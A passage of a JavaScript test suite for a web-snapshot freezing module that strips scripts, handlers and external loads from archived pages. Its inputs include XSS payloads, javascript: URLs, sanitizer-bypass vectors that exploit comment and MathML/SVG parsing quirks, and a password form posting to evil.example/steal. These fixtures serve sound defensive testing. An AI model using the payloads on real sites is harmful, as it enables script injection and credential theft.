/**
 * Freezing: what a snapshot stores (`freezePage`, at capture) and what is
 * shown and exported (`render`, on the way out). Checked by a second parser
 * (happy-dom's), never by the scanner that wrote it, and checked of both:
 * the stored page, and the page rendered from what was stored.
 *
 *   D1  inert: no script, no on* attribute, no http-equiv but ours, no
 *       javascript:, no <base>, no prefetch-family link — in the stored page,
 *       in what it renders to, and in every stored stylesheet and SVG.
 *   D2  no network: every load position, from a table written here, is (when
 *       stored) an `ni:` URI naming one of the snapshot's blobs, or (when
 *       rendered) a data: URL — or else the absolute URL of a resource that
 *       was not kept; and the first element in <head> is our CSP.
 *   D3  faithful: each blob an `ni:` URI names, and each data: URL, is
 *       exactly the kept bytes and type.
 *   D4  a capture of the stored page or of the export finds nothing to fetch
 *       but what was not kept.
 *   D5  freezing the same responses stores the same bytes; exporting twice
 *       gives the same bytes.
 */
import { describe, it, expect } from "vitest"
import { freezePage, render, freezeCss, CSP, PREFIX, rfc1123 } from "./freeze.js"
import { dataUrl, fromDataUrl, niUrl, parseNi, sha256Hex } from "./bytes.js"
import { scanHtml } from "./scan.js"
import { pageLinks, withoutFragment } from "./links.js"
import { cssLinks } from "./css.js"

const PAGE = "https://site.test/dir/page.html"
const at = (path) => new URL(path, PAGE).href
const text = (s) => new TextEncoder().encode(s)

/** Distinct bytes for each URL, so a data: URL names exactly one. */
function bytesFor(url, kind) {
  const magic = kind === "font" ? [0x77, 0x4f, 0x46, 0x32] : [0x89, 0x50, 0x4e, 0x47]
  return new Uint8Array([...magic, ...text(url)])
}
const MIME = { image: "image/png", font: "font/woff2", style: "text/css" }
/** The type each is written back as: a stylesheet is re-encoded as UTF-8, and says so. */
const WRITTEN = { ...MIME, style: "text/css;charset=utf-8" }

/**
 * A snapshot of `html` in which every URL in `found` was fetched: kept when
 * `kept` (or `keep(url)`), unreachable otherwise; frozen as a capture
 * freezes it. `sheets` gives stylesheets their text, `bytes` any URL its
 * own bytes, `charsets` a sheet its label, `types` a type of its own. The responses as received ride
 * along as `received`, outside the document, for the assertions.
 */
async function snapshot(html, found, { kept = true, sheets = {}, keep = null, bytes: given = {}, charsets = {}, types = {} } = {}) {
  const resources = {}
  const blobs = {}
  let order = 0
  for (const [url, kind] of Object.entries(found)) {
    const ok = keep ? keep(url) : kept
    if (!ok) {
      resources[url] = { kind, from: "page", order: String(order++), outcome: "unreachable", detail: "CORS or network" }
      continue
    }
    const bytes = given[url] ?? (kind === "style" ? text(sheets[url] ?? "") : bytesFor(url, kind))
    const sha = await sha256Hex(bytes)
    blobs[sha] = bytes
    resources[url] = { kind, from: "page", order: String(order++), outcome: "ok", mimeType: types[url] ?? MIME[kind], sha256: sha, bytes: bytes.byteLength, finalUrl: url, charset: charsets[url] ?? "utf-8" }
  }
  const frozen = await freezePage({ text: html, base: PAGE, resources, blobs })
  const doc = {
    "@patchwork": { type: "web-snapshot" },
    title: "Page",
    source: PAGE,
    capture: { at: Date.UTC(2026, 10, 16, 10, 2), finalUrl: PAGE, via: "reader", engine: "reader-dom", sha256: "abc123", bytes: frozen.html.byteLength },
    html: frozen.html,
    base: PAGE,
    resources: Object.fromEntries(Object.entries(resources).map(([u, r]) => [u, u in frozen.stored ? { ...r, stored: frozen.stored[u] } : r])),
    blobs: frozen.blobs,
  }
  Object.defineProperty(doc, "received", { value: { resources, blobs }, enumerable: false })
  return doc
}

/**
 * A value as the URL parser reads it before anything else: C0 controls and
 * spaces gone from either end, tabs and newlines from anywhere.
 */
const urlForm = (value) => value.replace(/[\t\n\r]/g, "").replace(/^[\x00-\x20]+|[\x00-\x20]+$/g, "")

/** The stored page, as text. */
const stored = (doc) => new TextDecoder().decode(doc.html)

/**
 * The second parser: happy-dom's, through a template so that nothing is
 * moved or dropped (its document parser discards what precedes an <html>
 * tag). It is a cruder parser than a browser's — it reads a textarea's
 * contents as markup, for one — which makes it a harsher judge of D1.
 */
const parse = (html) => {
  const template = document.createElement("template")
  template.innerHTML = html
  return template.content
}

/**
 * Every load position: the markup, and where each load ends up — [selector,
 * attribute, absolute URL, kind, gone]. Written from the table in links.js,
 * not read from it. `gone` marks a position that is removed when its
 * resource was not kept: an icon (the browser fetches it from outside the
 * page), and a picture <source> (so the <img> shows instead).
 */
const ROWS = [
  ["link stylesheet", `<link rel="stylesheet" href="s.css">`, [["link", "href", at("s.css"), "style"]]],
  ["link icon", `<link rel="icon" href="i.ico">`, [["link", "href", at("i.ico"), "image", true]]],
  ["link apple-touch-icon", `<link rel="apple-touch-icon" href="t.png">`, [["link", "href", at("t.png"), "image", true]]],
  ["link mask-icon", `<link rel="mask-icon" href="m.svg">`, [["link", "href", at("m.svg"), "image", true]]],
  ["img src", `<img src="a.png">`, [["img", "src", at("a.png"), "image"]]],
  ["img data-src", `<img src="data:image/gif;base64,R0lG" data-src="lazy.png">`, [["img", "src", at("lazy.png"), "image"]]],
  ["img data-lazy-src", `<img data-lazy-src="lazy2.png">`, [["img", "src", at("lazy2.png"), "image"]]],
  ["img srcset", `<img srcset="c1.png 1x, c2.png 2x">`, [["img", "src", at("c2.png"), "image"]]],
  ["picture source srcset", `<picture><source srcset="p1.png 1x, p2.png 2x"><img src="pi.png"></picture>`, [["source", "srcset", at("p2.png"), "image", true], ["img", "src", at("pi.png"), "image"]]],
  ["input image", `<input type="image" src="in.png">`, [["input", "src", at("in.png"), "image"]]],
  ["video poster", `<video poster="po.png"></video>`, [["video", "poster", at("po.png"), "image"]]],
  ["body background", `<body background="bg.png"></body>`, [["[background]", "background", at("bg.png"), "image"]]],
  ["table background", `<table background="tb.png"><tr><td background="td.png"></td><th background="th.png"></th></tr></table>`, [["table", "background", at("tb.png"), "image"], ["td", "background", at("td.png"), "image"], ["th", "background", at("th.png"), "image"]]],
  ["svg image href", `<svg><image href="si.png" /></svg>`, [["image", "href", at("si.png"), "image"]]],
  ["svg image xlink:href", `<svg><image xlink:href="sx.png" /></svg>`, [["image", "xlink:href", at("sx.png"), "image"]]],
  ["feImage", `<svg><filter><feImage href="fe.png" /></filter></svg>`, [["feImage", "href", at("fe.png"), "image"]]],
  ["use, with a fragment", `<svg><use href="sp.svg#icon" /></svg>`, [["use", "href", `${at("sp.svg")}#icon`, "image"]]],
  ["use xlink:href", `<svg><use xlink:href="ux.svg#i" /></svg>`, [["use", "xlink:href", `${at("ux.svg")}#i`, "image"]]],
]
/** Loads written in CSS on the page: [markup, the URL, how to find the CSS text in the parsed page]. */
const CSS_ROWS = [
  ["style attribute", `<div style="background:url(st.png)"></div>`, at("st.png"), (doc) => doc.querySelector("div").getAttribute("style")],
  ["style element", `<style>b{background:url('se.png')}</style>`, at("se.png"), (doc) => doc.querySelector("style").textContent],
]

/** The URLs a value or a CSS text loads: url() contents, unquoted. */
const cssUrls = (css) => [...css.matchAll(/url\(\s*(?:"((?:[^"\\]|\\.)*)"|([^)\s]*))\s*\)/g)].map((m) => (m[1] ?? m[2]).replace(/\\(.)/g, "$1"))

describe("D2 and D3: every load position, kept and not kept", () => {
  for (const [name, html, positions] of ROWS) {
    for (const kept of [true, false]) {
      it(`${name} · ${kept ? "kept" : "not kept"}`, async () => {
        const found = Object.fromEntries(positions.map(([, , url, kind]) => [withoutFragment(url), kind]))
        const doc = await snapshot(html, found, { kept })
        const shown = parse(render(doc))
        const kept_ = parse(stored(doc))
        for (const [selector, attr, url, kind, gone] of positions) {
          const value = shown.querySelector(selector)?.getAttribute(attr) ?? null
          const storedValue = kept_.querySelector(selector)?.getAttribute(attr) ?? null
          const key = withoutFragment(url)
          if (!kept) {
            expect(value, `${selector}[${attr}]`).toBe(gone ? null : url)
            expect(storedValue, `stored ${selector}[${attr}]`).toBe(gone ? null : url)
            continue
          }
          const fragment = url.slice(key.length)
          // Stored: an ni: URI naming the blob that holds exactly the bytes received.
          expect(storedValue.endsWith(fragment)).toBe(true)
          const named = parseNi(storedValue.slice(0, storedValue.length - fragment.length))
          expect(named.sha256).toBe(doc.resources[key].stored)
          if (kind !== "style") expect([named.mimeType, [...doc.blobs[named.sha256]]]).toEqual([MIME[kind], [...bytesFor(key, kind)]])
          // Shown: a data: URL of those bytes, as the kept type.
          expect(value.endsWith(fragment)).toBe(true)
          const decoded = fromDataUrl(value.slice(0, value.length - fragment.length))
          expect(decoded.mimeType).toBe(WRITTEN[kind])
          if (kind !== "style") expect([...decoded.bytes]).toEqual([...bytesFor(key, kind)])
        }
      })
    }
  }

  for (const [name, html, url, cssOf] of CSS_ROWS) {
    for (const kept of [true, false]) {
      it(`${name} · ${kept ? "kept" : "not kept"}`, async () => {
        const doc = await snapshot(html, { [url]: "image" }, { kept })
        const [value] = cssUrls(cssOf(parse(render(doc))))
        if (!kept) expect(value).toBe(url)
        else expect([...fromDataUrl(value).bytes]).toEqual([...bytesFor(url, "image")])
      })
    }
  }

  it("a kept stylesheet becomes its frozen self: imports, fonts and images inside it rewritten, recursively", async () => {
    const sheets = {
      [at("s.css")]: `@import "t.css"; x{background:url(ci.png)} @font-face{src:url(f.woff2)} y{background:url(gone.png)}`,
      [at("t.css")]: `z{background:url(ti.png)}`,
    }
    const found = { [at("s.css")]: "style", [at("t.css")]: "style", [at("ci.png")]: "image", [at("f.woff2")]: "font", [at("ti.png")]: "image", [at("gone.png")]: "image" }
    const doc = await snapshot(`<link rel=stylesheet href=s.css>`, found, { sheets, keep: (u) => !u.endsWith("gone.png") })
    const href = parse(render(doc)).querySelector("link").getAttribute("href")
    const outer = new TextDecoder().decode(fromDataUrl(href).bytes)
    const [imported, image, font, gone] = cssUrls(outer)
    expect(fromDataUrl(image).bytes).toEqual(bytesFor(at("ci.png"), "image"))
    expect(fromDataUrl(font).mimeType).toBe("font/woff2")
    expect(gone).toBe(at("gone.png"))
    const inner = new TextDecoder().decode(fromDataUrl(imported).bytes)
    expect(fromDataUrl(cssUrls(inner)[0]).bytes).toEqual(bytesFor(at("ti.png"), "image"))
  })

  it("a kept sheet in a legacy encoding reads as the same text in a browser", async () => {
    // How a browser decodes a sheet (CSS Syntax §3.2): the charset its
    // protocol gives — a data: URL's parameter — else its @charset rule at
    // byte 0, else utf-8.
    const browserCss = (url) => {
      const { mimeType, bytes } = fromDataUrl(url)
      const protocol = mimeType.match(/;\s*charset=([^;]+)/i)?.[1]
      const rule = new TextDecoder("latin1").decode(bytes.subarray(0, 1024)).match(/^@charset "([^"]*)";/)?.[1]
      return new TextDecoder(protocol ?? rule ?? "utf-8").decode(bytes)
    }
    const url = at("l.css")
    const bytes = new Uint8Array([...text(`@charset "iso-8859-1";p::before{content:"caf`), 0xe9, ...text(`"}`)])
    const doc = await snapshot(`<link rel=stylesheet href=l.css>`, { [url]: "style" }, { bytes: { [url]: bytes }, charsets: { [url]: "windows-1252" } })
    // Stored as UTF-8, which is what it is then shown as.
    expect(new TextDecoder("utf-8", { fatal: true }).decode(doc.blobs[doc.resources[url].stored])).toBe(`@charset "iso-8859-1";p::before{content:"café"}`)
    const href = parse(render(doc)).querySelector("link").getAttribute("href")
    expect(browserCss(href)).toBe(`@charset "iso-8859-1";p::before{content:"café"}`)
  })

  it("a picture's <source> whose image was not kept steps aside for the <img>", async () => {
    const doc = await snapshot(`<picture><source srcset="p1.png 1x, p2.png 2x"><img src="pi.png"></picture>`, { [at("p2.png")]: "image", [at("pi.png")]: "image" }, { keep: (u) => u.endsWith("pi.png") })
    const page = parse(render(doc))
    expect(page.querySelector("source").hasAttribute("srcset")).toBe(false)
    expect([...fromDataUrl(page.querySelector("img").getAttribute("src")).bytes]).toEqual([...bytesFor(at("pi.png"), "image")])
  })

  it("an @import cycle ends in an absolute URL", async () => {
    const a = at("a.css")
    const b = at("b.css")
    const doc = await snapshot(`<link rel=stylesheet href=a.css>`, { [a]: "style", [b]: "style" }, { sheets: { [a]: `@import "b.css";`, [b]: `@import "a.css";` } })
    const outer = new TextDecoder().decode(fromDataUrl(parse(render(doc)).querySelector("link").getAttribute("href")).bytes)
    const inner = new TextDecoder().decode(fromDataUrl(cssUrls(outer)[0]).bytes)
    expect(cssUrls(inner)).toEqual([a])
    // Stored: a imports b by its hash, and b imports a by its address.
    expect(new TextDecoder().decode(doc.blobs[doc.resources[b].stored])).toBe(`@import url("${a}");`)
    expect(freezeCss(`@import "a.css";`, PAGE, () => null)).toBe(`@import url("${a}");`)
  })

  it("policy loads are made absolute, so nothing resolves against the page showing the frame", async () => {
    const html = `<iframe src="f.html"></iframe><video src="v.mp4"></video><audio src="au.mp3"></audio><video><source src="s.mp4"><track src="t.vtt"></video><object data="o.swf"></object><embed src="e.swf">`
    const page = parse(render(await snapshot(html, {})))
    expect([
      page.querySelector("iframe").getAttribute("src"),
      page.querySelector("video").getAttribute("src"),
      page.querySelector("audio").getAttribute("src"),
      page.querySelector("source").getAttribute("src"),
      page.querySelector("track").getAttribute("src"),
      page.querySelector("object").getAttribute("data"),
      page.querySelector("embed").getAttribute("src"),
    ]).toEqual([at("f.html"), at("v.mp4"), at("au.mp3"), at("s.mp4"), at("t.vtt"), at("o.swf"), at("e.swf")])
  })

  it("links are absolute and open in a new tab, without the page's own target or rel", async () => {
    const page = parse(render(await snapshot(`<a href="/p" target="_self" rel="opener">p</a><map><area href="q"></map><a href="#here">here</a><a href="data:text/html,x">d</a>`, {})))
    const [a, , fragment, data] = page.querySelectorAll("a, area")
    expect([a.getAttribute("href"), a.getAttribute("target"), a.getAttribute("rel")]).toEqual(["https://site.test/p", "_blank", "noopener noreferrer"])
    expect(page.querySelector("area").getAttribute("href")).toBe(at("q"))
    // A link within the page stays one; a data: link goes nowhere.
    expect([fragment.getAttribute("href"), fragment.getAttribute("target")]).toEqual(["#here", null])
    expect(data.getAttribute("href")).toBe("#")
  })
})

describe("D1: inert", () => {
  const REMOVED = [
    ["inline script", `<script>alert(1)</script><p>ok</p>`],
    ["script src", `<script src="x.js"></script><p>ok</p>`],
    ["unterminated script", `<p>ok</p><script>alert(1)`],
    ["script in svg", `<svg><script>alert(1)</script></svg><p>ok</p>`],
    ["noscript", `<noscript><img src="n.png"></noscript><p>ok</p>`],
    ["base", `<base href="https://evil.test/"><p>ok</p>`],
    ["meta refresh", `<meta http-equiv="refresh" content="0;url=https://evil.test/"><p>ok</p>`],
    ["meta refresh, HTTP-EQUIV", `<meta HTTP-EQUIV="Refresh" content="0;url=https://evil.test/"><p>ok</p>`],
    ["meta refresh, unquoted", `<meta http-equiv=refresh content=0><p>ok</p>`],
    ["a stored CSP", `<meta http-equiv="Content-Security-Policy" content="default-src *"><p>ok</p>`],
    ["meta charset", `<meta charset="latin1"><p>ok</p>`],
    ...["preload", "prefetch", "modulepreload", "dns-prefetch", "preconnect", "prerender", "manifest"].map((rel) => [`link rel=${rel}`, `<link rel="${rel}" href="x"><p>ok</p>`]),
    ["onclick", `<p onclick="alert(1)">ok</p>`],
    ["onload on body", `<body onload="alert(1)"><p>ok</p></body>`],
    ["onerror, repeated", `<img src="a.png" onerror="one()" ONERROR="two()" onerror="three()"><p>ok</p>`],
    ["integrity, nonce, ping", `<link rel=stylesheet href=s.css integrity="sha384-x" nonce="n"><a href="x" ping="https://track.test/">ok</a>`],
    ["form action, formaction", `<form action="https://evil.test/"><button formaction="https://evil.test/">ok</button></form>`],
    ["html manifest", `<html manifest="x.appcache"><p>ok</p></html>`],
    ["javascript: href", `<a href="javascript:alert(1)">ok</a>`],
    ["javascript: hidden by a tab entity", `<a href="java&#9;script:alert(1)">ok</a>`],
    ["javascript: in an iframe", `<iframe src="javascript:alert(1)"></iframe><p>ok</p>`],
    ["iframe srcdoc", `<iframe srcdoc="<script>alert(1)</script>"></iframe><p>ok</p>`],
  ]

  /** Every D1 property of a parsed frozen page. */
  function assertInert(html) {
    const page = parse(html)
    expect(page.querySelectorAll("script").length).toBe(0)
    expect(page.querySelectorAll("base").length).toBe(0)
    for (const el of page.querySelectorAll("*")) {
      for (const { name, value } of el.attributes) {
        expect(name.startsWith("on"), `${el.tagName} ${name}`).toBe(false)
        expect(["integrity", "nonce", "ping", "action", "formaction", "manifest", "srcdoc"]).not.toContain(name)
        expect(/^(javascript|vbscript):/i.test(urlForm(value)), `${el.tagName} ${name}=${value}`).toBe(false)
      }
      if (el.tagName === "LINK") {
        const rels = (el.getAttribute("rel") ?? "").toLowerCase().split(/\s+/)
        expect(rels.some((r) => ["preload", "prefetch", "modulepreload", "dns-prefetch", "preconnect", "prerender", "manifest"].includes(r))).toBe(false)
      }
    }
    // Ours, and only ours, carry http-equiv.
    const equiv = [...page.querySelectorAll("[http-equiv]")].map((m) => m.getAttribute("http-equiv"))
    expect(equiv.filter((e) => !["Content-Security-Policy", "x-dns-prefetch-control", "Memento-Datetime"].includes(e))).toEqual([])
    expect(equiv.filter((e) => e === "Content-Security-Policy")).toHaveLength(1)
    // And as text: every http-equiv after our prefix is renamed.
    const rest = html.slice(html.indexOf(PREFIX) + PREFIX.length).replace(/^<meta http-equiv="Memento-Datetime"/, "")
    for (const match of rest.matchAll(/http-equiv/gi)) expect(rest.slice(Math.max(0, match.index - 7), match.index)).toBe("data-x-")
    // D2's other half: nothing but a doctype comes before our CSP. Checked
    // on the string: happy-dom's parser does not move a leading <meta> into
    // <head> as a browser's does (probe P5 checks that in Chrome).
    expect(html.replace(/^<!doctype[^>]*>/i, "").startsWith(`<meta http-equiv="Content-Security-Policy" content="${CSP}">`)).toBe(true)
    expect(page.querySelector("meta").getAttribute("content")).toBe(CSP)
  }

  it.each(REMOVED)("%s", async (_, html) => {
    const doc = await snapshot(html, {})
    // What is stored is inert, and so is what it is shown and exported as.
    assertInert(stored(doc))
    const out = render(doc)
    assertInert(out)
    assertInert(render(doc, { export: true }))
    // What the page said is still there.
    expect(parse(stored(doc)).textContent).toContain("ok")
    expect(parse(out).textContent).toContain("ok")
  })

  // A snapshot is a shared document: what a collaborator writes into its
  // stored page is frozen again on the way out.
  it.each(REMOVED)("%s, written into the stored page afterwards, is removed when shown", async (_, html) => {
    const doc = await snapshot(`<p>before</p>`, {})
    doc.html = text(stored(doc) + html)
    assertInert(render(doc))
    assertInert(render(doc, { export: true }))
  })

  it("an SVG image is stored frozen: its script and handlers are gone, its picture kept", async () => {
    const url = at("pic.svg")
    const svg = text(`<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(2)</script><a href="javascript:alert(3)"><rect width="1" height="1"/></a><image href="https://evil.test/beacon.png"/></svg>`)
    const doc = await snapshot(`<img src="pic.svg">`, { [url]: "image" }, { bytes: { [url]: svg }, types: { [url]: "image/svg+xml" } })
    const kept = new TextDecoder().decode(doc.blobs[doc.resources[url].stored])
    expect(kept).toBe(`<svg xmlns="http://www.w3.org/2000/svg" ><a href="#"><rect width="1" height="1"/></a><image href="https://evil.test/beacon.png"/></svg>`)
    expect(parseNi(parse(stored(doc)).querySelector("img").getAttribute("src"))).toEqual({ sha256: doc.resources[url].stored, mimeType: "image/svg+xml" })
    expect(fromDataUrl(parse(render(doc)).querySelector("img").getAttribute("src"))).toEqual({ mimeType: "image/svg+xml", bytes: text(kept) })
  })

  it("renames http-equiv wherever it is written, text included", async () => {
    const doc = await snapshot(`<p>the http-equiv attribute</p><textarea><meta http-equiv=refresh content=0></textarea>`, {})
    assertInert(stored(doc))
    const out = render(doc)
    assertInert(out)
    // Renamed once, however many times it is frozen.
    expect(stored(doc)).toContain("<p>the data-x-http-equiv attribute</p>")
    expect(parse(out).querySelector("p").textContent).toBe("the data-x-http-equiv attribute")
    expect(out).toContain("<textarea>&lt;meta data-x-http-equiv=refresh content=0></textarea>")
  })

  // Where the scanner reads a refresh as text — an attribute value, a
  // comment, raw text — it is renamed all the same, since renaming is done to
  // the whole output: were a browser to read that text as a tag, it would
  // find no http-equiv in it.
  it.each([
    ["an attribute value", `<p title="<meta http-equiv=refresh content=0>">ok</p>`],
    ["a comment", `<!-- <meta http-equiv=refresh content=0> --><p>ok</p>`],
    ["raw text", `<iframe><meta http-equiv=refresh content=0></iframe><p>ok</p>`],
    ["a CDATA section", `<svg><text><![CDATA[<meta http-equiv=refresh content=0>]]></text></svg><p>ok</p>`],
  ])("a refresh the scanner reads as text, in %s, is still renamed", async (_, html) => {
    const doc = await snapshot(html, {})
    assertInert(stored(doc))
    const out = render(doc)
    assertInert(out)
    const body = out.slice(out.indexOf(PREFIX) + PREFIX.length)
    expect(body).toContain("data-x-http-equiv=refresh")
    expect(body).not.toMatch(/(?<!data-x-)http-equiv/i)
  })

  it("keeps the doctype first, then our prefix", async () => {
    const doc = await snapshot(`<!DOCTYPE html><html><head><title>t</title></head><body>ok</body></html>`, {})
    expect(stored(doc).startsWith(`<!DOCTYPE html>${PREFIX}<html>`)).toBe(true)
    expect(render(doc).startsWith(`<!DOCTYPE html>${PREFIX}<html>`)).toBe(true)
  })
})

describe("export", () => {
  const html = `<!doctype html><title>Page</title><link rel=stylesheet href=s.css><img src=a.png><img src=gone.png><img data-src=lazy.png><picture><source srcset="p.png 2x"><img src=pi.png></picture><a href=next.html>next</a><img src=lo.png data-src=hi.png><img src=a2.png data-lazy-src=b2.png>`
  const found = { [at("s.css")]: "style", [at("a.png")]: "image", [at("gone.png")]: "image", [at("lazy.png")]: "image", [at("p.png")]: "image", [at("pi.png")]: "image", [at("lo.png")]: "image", [at("a2.png")]: "image" }

  it("carries the Memento tags and our marker", async () => {
    const out = render(await snapshot(html, found), { export: true })
    const page = parse(out)
    expect(page.querySelector('meta[http-equiv="Memento-Datetime"]').getAttribute("content")).toBe("Mon, 16 Nov 2026 10:02:00 GMT")
    expect(rfc1123(Date.UTC(2026, 10, 16, 10, 2))).toBe("Mon, 16 Nov 2026 10:02:00 GMT")
    expect(page.querySelector('link[rel="original"]').getAttribute("href")).toBe(PAGE)
    expect(page.querySelector('meta[name="patchwork-snapshot"]').getAttribute("content")).toBe("abc123")
  })

  it("D4: a capture of the stored page or of the export finds nothing to fetch but what was not kept", async () => {
    // Not kept, a picture <source> is removed, so it is not found again either.
    const removed = new Set([at("p.png")])
    for (const keep of [() => true, (u) => !u.endsWith("gone.png"), () => false]) {
      const doc = await snapshot(html, found, { sheets: { [at("s.css")]: "x{}" }, keep })
      const notKept = new Set(Object.entries(doc.resources).filter(([, r]) => r.outcome !== "ok").map(([u]) => u).filter((u) => !removed.has(u)))
      const loads = (page) => pageLinks(scanHtml(page), PAGE).filter((l) => !l.policy && !l.nav && !l.bad)
      const out = render(doc, { export: true })
      expect(new Set(loads(out).map((l) => withoutFragment(l.url)))).toEqual(notKept)
      // Stored, the rest are ni: URIs, and each names a blob the snapshot holds.
      const storedLoads = loads(stored(doc)).map((l) => withoutFragment(l.url))
      expect(new Set(storedLoads.filter((u) => !u.startsWith("ni:")))).toEqual(notKept)
      for (const u of storedLoads.filter((u) => u.startsWith("ni:"))) expect(doc.blobs[parseNi(u).sha256], u).toBeInstanceOf(Uint8Array)
    }
  })

  it("D5: freezing the same responses stores the same bytes, and exporting twice gives the same bytes", async () => {
    const options = { sheets: { [at("s.css")]: "x{background:url(a.png)}" } }
    const doc = await snapshot(html, found, options)
    const again = await snapshot(html, found, options)
    expect(stored(again)).toBe(stored(doc))
    expect(again.blobs).toEqual(doc.blobs)
    const first = render(doc, { export: true })
    expect(render(doc, { export: true })).toBe(first)
    expect(render(structuredClone(doc), { export: true })).toBe(first)
  })

  it("freezing what is stored, with what it stores, changes nothing: the stored page is already frozen", async () => {
    const doc = await snapshot(html, found, { sheets: { [at("s.css")]: "x{background:url(a.png)}" } })
    const refrozen = await freezePage({ text: stored(doc), base: PAGE, resources: {}, blobs: doc.blobs })
    expect(new TextDecoder().decode(refrozen.html)).toBe(stored(doc))
  })

  it("names stored bytes by an ni: URI that reads back as exactly its hash and type, and nothing else does", async () => {
    const hashes = ["00".repeat(32), "ff".repeat(32), await sha256Hex(text("x"))]
    for (const sha256 of hashes) {
      for (const mimeType of ["image/png", "image/svg+xml", "text/css", "font/woff2", "application/vnd.ms-fontobject"]) {
        const url = niUrl(sha256, mimeType)
        expect(parseNi(url)).toEqual({ sha256, mimeType })
        // The URL parser leaves it as it is, so a link to it is found as written.
        expect(new URL(url, PAGE).href).toBe(url)
      }
    }
    const good = niUrl(hashes[2], "image/png")
    const hash = good.slice("ni:///sha-256;".length, good.indexOf("?"))
    for (const forged of [
      `ni:///sha-256;${hash}?ct=text%2Fhtml%2C%3Cscript%3Ealert(1)%3C%2Fscript%3E`,
      `ni:///sha-256;${hash}?ct=image%2Fpng%3Bbase64`,
      `ni:///sha-256;${hash}?ct=`,
      `ni:///sha-256;${hash}`,
      `ni:///sha-256;${hash}?ct=image%2Fpng&x=1`,
      `ni:///sha-256;${hash.slice(1)}?ct=image%2Fpng`,
      `ni:///sha-512;${hash}?ct=image%2Fpng`,
      `ni://host/sha-256;${hash}?ct=image%2Fpng`,
      `https://site.test/sha-256;${hash}?ct=image%2Fpng`,
    ]) expect(parseNi(forged), forged).toBe(null)
    expect(() => niUrl("not hex", "image/png")).toThrow()
  })

  it("shows nothing for an ni: URI it does not hold, or whose type is forged", async () => {
    const url = at("a.png")
    const doc = await snapshot(`<img src="a.png">`, { [url]: "image" })
    const sha = doc.resources[url].stored
    const hash = niUrl(sha, "image/png").split(";")[1].split("?")[0]
    const forged = `ni:///sha-256;${hash}?ct=text%2Fhtml%2C%3Cb%3Ex`
    const missing = niUrl("00".repeat(32), "image/png")
    doc.html = text(`${stored(doc)}<img id=f src="${forged}"><img id=m src="${missing}">`)
    const page = parse(render(doc))
    expect(page.querySelector("#f").getAttribute("src")).toBe(forged)
    expect(page.querySelector("#m").getAttribute("src")).toBe(missing)
    expect(fromDataUrl(page.querySelector("img").getAttribute("src")).bytes).toEqual(bytesFor(url, "image"))
  })

  it("encodes kept bytes as standard base64", async () => {
    expect(dataUrl("image/png", new Uint8Array([0, 1, 2, 3, 254, 255]))).toBe("data:image/png;base64,AAECA/7/")
    expect(fromDataUrl("data:image/png;base64,AAECA/7/").bytes).toEqual(new Uint8Array([0, 1, 2, 3, 254, 255]))
    for (const n of [0, 1, 2, 3, 4, 5]) {
      const bytes = Uint8Array.from({ length: n }, (_, i) => i * 37)
      expect(fromDataUrl(dataUrl("x/y", bytes)).bytes).toEqual(bytes)
    }
  })
})

/** What freeze writes after its prefix, for a page in which `found` was fetched. */
const bodyOf = async (html, found = {}, options = {}) => {
  const out = render(await snapshot(html, found, options))
  return out.slice(out.indexOf(PREFIX) + PREFIX.length)
}
const R = (path) => `src="${at(path)}"`

describe("the policy", () => {
  it("allows nothing but data: images, media, styles and fonts; no frame, no form submission, no <base>", async () => {
    const directives = Object.fromEntries(CSP.split(";").map((d) => d.trim().split(/\s+/)).map(([name, ...values]) => [name, values]))
    expect(directives).toEqual({
      "default-src": ["'none'"],
      "img-src": ["data:"],
      "media-src": ["data:"],
      "style-src": ["data:", "'unsafe-inline'"],
      "font-src": ["data:"],
      // form-action and base-uri do not fall back to default-src: they must be said.
      "frame-src": ["'none'"],
      "form-action": ["'none'"],
      "base-uri": ["'none'"],
    })
  })
})

describe("where a browser reads markup the scanner might not", () => {
  // Each: the page, and exactly what freeze writes, from the rules: a comment
  // ends at "-->" or "--!>"; integration points by namespace; an end tag that
  // closes an HTML ancestor leaves foreign content; and every "<" the scanner
  // read as text is escaped, so that if a browser reads the region as markup
  // it finds no tag the scanner did not rewrite.
  const CASES = [
    [
      "a comment ended by --!>",
      `<p>hi<!-- --!><form action="https://evil.example/steal"><input name=pw type=password><button formaction="https://evil.example/2">Sign in</button></form><img src=x onerror=alert(1)><base href="https://evil.example/"> -->`,
      `<p>hi<!-- --!><form ><input name=pw type=password><button >Sign in</button></form><img ${R("x")} > -->`,
    ],
    [
      "a style in a MathML text integration point is raw text",
      `<math><mi><style><a title="</style><form action=https://evil.example/s><button>Go</button></form><img src=rel.png onerror=alert(1)>"></a></style></mi></math>`,
      `<math><mi><style>\\3c a title="</style><form ><button>Go</button></form><img ${R("rel.png")} >"></a></style></mi></math>`,
    ],
    [
      "a style in a MathML title is foreign, and a <p> breaks out of it",
      `<math><title><style><p><form action=https://evil.example/s><button>Go</button></form><img src=rel.png onerror=alert(1)></style></title></math>`,
      `<math><title><style><p><form ><button>Go</button></form><img ${R("rel.png")} ></style></title></math>`,
    ],
    [
      "</div> closes the svg inside it",
      `<div><svg></div><style><a title="</style><img src=rel.png onerror=alert(1)><form action=https://evil.example/s><button>x</button></form>">`,
      `<div><svg></div><style>\\3c a title="</style><img ${R("rel.png")} ><form ><button>x</button></form>">`,
    ],
    ["</p> breaks out of svg", `<svg></p><style><a title="</style><img src=rel.png onerror=alert(1)>">`, `<svg></p><style>\\3c a title="</style><img ${R("rel.png")} >">`],
    [
      "an attribute value never holds a <",
      `<svg><style><a title="</style><img src=rel.png onerror=alert(1)>"></a></style></svg>`,
      `<svg><style><a title="&lt;/style>&lt;img src=rel.png onerror=alert(1)>"></a></style></svg>`,
    ],
    ["an unquoted one neither", `<p title=a<b>x</p>`, `<p title=a&lt;b>x</p>`],
    ["a comment never holds a <", `<svg><style><!-- </style><img src=rel.png onerror=alert(1)> --></style></svg>`, `<svg><style><!-- &lt;/style>&lt;img src=rel.png onerror=alert(1)> --></style></svg>`],
    ["a bogus comment neither", `</ <p title="><img src=rel.png onerror=alert(1)>">`, `</ &lt;p title="><img ${R("rel.png")} >">`],
    ["a CDATA section in a style becomes escaped text", `<svg><style><![CDATA[</style><img src=rel.png onerror=alert(1)>]]></style></svg>`, `<svg><style>&lt;/style>&lt;img src=rel.png onerror=alert(1)></style></svg>`],
    ["any CDATA section does", `<svg><text><![CDATA[a<b&c]]></text></svg>`, `<svg><text>a&lt;b&amp;c</text></svg>`],
    ["an end tag's attributes go", `<svg><style></x a="</style><img src=rel.png onerror=alert(1)>"></style></svg>`, `<svg><style></x></style></svg>`],
